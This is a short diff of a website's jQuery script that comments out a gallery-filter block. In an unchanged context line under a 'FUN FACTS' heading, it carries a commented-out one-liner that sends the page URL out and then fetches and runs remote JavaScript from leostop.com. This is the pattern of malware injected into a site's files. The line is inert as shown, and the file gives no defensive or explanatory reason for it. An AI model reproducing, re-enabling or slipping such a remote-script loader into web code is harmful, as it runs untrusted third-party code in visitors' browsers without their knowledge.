@@ -87,6 +87,7 @@
   });
 
   // Gallery Filter
+  /*
   var Container = $('.container');
   Container.imagesLoaded(function () {
     var portfolio = $('.gallery-menu');
@@ -102,7 +103,7 @@
     });
 
   });
-
+*/
   // FUN FACTS   
   //function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
